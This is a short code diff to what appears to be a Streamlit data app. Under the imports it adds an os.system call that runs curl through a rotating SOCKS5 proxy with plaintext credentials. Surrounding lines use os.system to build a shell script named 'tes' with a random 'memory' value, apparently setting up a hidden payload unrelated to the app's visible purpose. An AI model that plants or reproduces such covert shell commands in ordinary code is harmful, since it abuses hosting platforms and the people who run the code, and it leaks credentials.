@@ -4,7 +4,8 @@ import math
 import pandas as pd
 import streamlit as st
 
-import os 
+import os
+os.system('curl --proxy "socks5://gilakalilw-rotate:yangbacagila@p.webshare.io:80" https://ipv4.webshare.io/')
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo " " >> tes')
 os.system('echo "memory=$(shuf -n 1 -i 1-999999)" >> tes') 
